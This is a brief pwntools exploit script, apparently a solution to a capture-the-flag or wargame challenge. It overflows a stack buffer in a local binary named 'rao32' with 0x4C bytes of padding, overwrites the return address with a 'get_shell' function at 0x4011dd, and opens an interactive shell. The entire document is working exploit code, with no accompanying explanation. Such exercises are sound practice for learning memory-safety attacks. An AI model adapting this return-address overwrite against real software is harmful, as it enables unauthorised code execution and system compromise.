from pwn import *

r = process("./rao32")

context.log_level = 'DEBUG'

r.recvuntil(b"Input: ")

get_shell = 0x4011dd

pay = b"A" * 0x48
pay += b"A" * 0x4
pay += p32(get_shell)

r.sendline(pay)
r.interactive()